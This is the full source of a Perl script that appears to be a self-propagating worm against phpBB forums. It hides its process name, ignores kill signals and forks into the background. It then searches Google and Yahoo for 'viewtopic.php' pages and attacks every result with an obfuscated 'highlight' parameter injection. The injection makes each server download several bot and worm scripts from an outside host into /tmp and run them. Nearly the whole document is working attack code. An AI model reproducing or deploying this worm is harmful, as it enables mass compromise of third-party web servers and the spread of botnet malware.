#/usr/bin/perl

#####################
####
####  ####  #### #### ####  #### #### #  # #  # ####
####  #  #  #  # #    #  #  #    #    #  # # #  #
####  ####  #  # ###  ##    #### #    #### ##   ###
####  #     #  # #    # #      # #    #  # # #  #
####  #     #### #### #  #  #### #### #  # #  # ####
####
use IO::Socket;
use LWP::Simple;
my $processo = "/usr/local/sbin/httpd - spy";
$SIG{"INT"} = "IGNORE";
$SIG{"HUP"} = "IGNORE";
$SIG{"TERM"} = "IGNORE";
$SIG{"CHLD"} = "IGNORE";
$SIG{"PS"} = "IGNORE";

$0="$processo"."\0"x16;;
my $pid=fork;
exit if $pid;
die "Problema com o fork: $!" unless defined($pid);

while(1){
@vul = "";
$a=0;
$numero = int rand(999);
$site = "www.google.com";
$procura = "inurl:viewtopic.php?t=$numero";

######################################
for($n=0;$n<900;$n += 10){
$sock = IO::Socket::INET->new(PeerAddr=>"$site",PeerPort=>"80",Proto=>"tcp") or next;
print $sock "GET /search?q=$procura&start=$n HTTP/1.0\n\n";
@resu = <$sock>;
close($sock);
$ae = "@resu";
while ($ae=~ m/<a href=.*?>.*?<\/a>/){
  $ae=~ s/<a href=(.*?)>.*?<\/a>/$1/;
  $uber=$1;
if ($uber !~/translate/)
{if ($uber !~ /cache/)
{if ($uber !~ /"/)
{if ($uber !~ /google/)
{if ($uber !~ /216/)
{if ($uber =~/http/)
{if ($uber !~ /start=/)
{
if ($uber =~/&/)
   {
   $nu = index $uber, '&';
   $uber = substr($uber,0,$nu);
   }
$vul[$a] = $uber;
$a++;
}}}}}}}}}
##########################
for($cadenu=1;$cadenu <= 991; $cadenu +=10){

@cade = get("http://cade.search.yahoo.com/search?p=$procura&ei=UTF-8&fl=0&all=1&pstart=1&b=$cadenu") or next;
$ae = "@cade";

while ($ae=~ m/<em class=yschurl>.*?<\/em>/){
  $ae=~ s/<em class=yschurl>(.*?)<\/em>/$1/;
  $uber=$1;
  
$uber =~ s/ //g;
$uber =~ s/<b>//g;
$uber =~ s/<\/b>//g;
$uber =~ s/<wbr>//g;

if ($uber =~/&/)
   {
   $nu = index $uber, '&';
   $uber = substr($uber,0,$nu);
   }
$vul[$a] = $uber;
$a++
}}

#########################


$wb = '&highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(119)%252echr(119)%252echr(119)%252echr(46)%252echr(118)%252echr(105)%252echr(115)%252echr(117)%252echr(97)%252echr(108)%252echr(99)%252echr(111)%252echr(100)%252echr(101)%252echr(114)%252echr(115)%252echr(46)%252echr(110)%252echr(101)%252echr(116)%252echr(47)%252echr(115)%252echr(112)%252echr(121)%252echr(98)%252echr(111)%252echr(116)%252echr(46)%252echr(116)%252echr(120)%252echr(116)%252echr(59)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(119)%252echr(119)%252echr(119)%252echr(46)%252echr(118)%252echr(105)%252echr(115)%252echr(117)%252echr(97)%252echr(108)%252echr(99)%252echr(111)%252echr(100)%252echr(101)%252echr(114)%252echr(115)%252echr(46)%252echr(110)%252echr(101)%252echr(116)%252echr(47)%252echr(119)%252echr(111)%252echr(114)%252echr(109)%252echr(49)%252echr(46)%252echr(116)%252echr(120)%252echr(116)%252echr(59)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(119)%252echr(119)%252echr(119)%252echr(46)%252echr(118)%252echr(105)%252echr(115)%252echr(117)%252echr(97)%252echr(108)%252echr(99)%252echr(111)%252echr(100)%252echr(101)%252echr(114)%252echr(115)%252echr(46)%252echr(110)%252echr(101)%252echr(116)%252echr(47)%252echr(112)%252echr(104)%252echr(112)%252echr(46)%252echr(116)%252echr(120)%252echr(116)%252echr(59)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(119)%252echr(119)%252echr(119)%252echr(46)%252echr(118)%252echr(105)%252echr(115)%252echr(117)%252echr(97)%252echr(108)%252echr(99)%252echr(111)%252echr(100)%252echr(101)%252echr(114)%252echr(115)%252echr(46)%252echr(110)%252echr(101)%252echr(116)%252echr(47)%252echr(111)%252echr(119)%252echr(110)%252echr(122)%252echr(46)%252echr(116)%252echr(120)%252echr(116)%252echr(59)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(119)%252echr(119)%252echr(119)%252echr(46)%252echr(118)%252echr(105)%252echr(115)%252echr(117)%252echr(97)%252echr(108)%252echr(99)%252echr(111)%252echr(100)%252echr(101)%252echr(114)%252echr(115)%252echr(46)%252echr(110)%252echr(101)%252echr(116)%252echr(47)%252echr(122)%252echr(111)%252echr(110)%252echr(101)%252echr(46)%252echr(116)%252echr(120)%252echr(116)%252echr(59)%252echr(112)%252echr(101)%252echr(114)%252echr(108)%252echr(32)%252echr(115)%252echr(112)%252echr(121)%252echr(98)%252echr(111)%252echr(116)%252echr(46)%252echr(116)%252echr(120)%252echr(116)%252echr(59)%252echr(112)%252echr(101)%252echr(114)%252echr(108)%252echr(32)%252echr(119)%252echr(111)%252echr(114)%252echr(109)%252echr(49)%252echr(46)%252echr(116)%252echr(120)%252echr(116)%252echr(59)%252echr(112)%252echr(101)%252echr(114)%252echr(108)%252echr(32)%252echr(111)%252echr(119)%252echr(110)%252echr(122)%252echr(46)%252echr(116)%252echr(120)%252echr(116)%252echr(59)%252echr(112)%252echr(101)%252echr(114)%252echr(108)%252echr(32)%252echr(112)%252echr(104)%252echr(112)%252echr(46)%252echr(116)%252echr(120)%252echr(116))%252e%2527';


$b = scalar(@vul);

for($a=0;$a<=$b;$a++)
{
$sitevul = $vul[$a] . $wb;
if($sitevul !~/http/){ $sitevul = 'http://' . $sitevul; }

$teste1 = get($sitevul) or next;
$teste1 = "";
}
}











